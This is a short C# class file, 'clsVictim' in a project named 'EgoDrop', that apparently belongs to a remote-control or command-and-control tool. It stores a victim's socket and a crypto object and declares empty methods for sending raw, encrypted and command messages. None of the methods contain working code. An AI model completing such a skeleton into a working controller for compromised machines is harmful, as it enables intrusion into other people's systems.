using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    public class clsVictim
    {
        public Socket m_sktClnt;
        public byte[] m_abBuffer = new byte[65535];

        public clsCrypto m_crypto { get; set; }

        public clsVictim(Socket sktClnt)
        {
            m_sktClnt = sktClnt;
            m_crypto = new clsCrypto(true);
        }

        public void fnSendRaw()
        {

        }

        public void fnSendEnc()
        {

        }

        public void fnSendCmdParam(int nCmd, int nParam)
        {

        }

        public void fnSendCommand()
        {

        }
    }
}
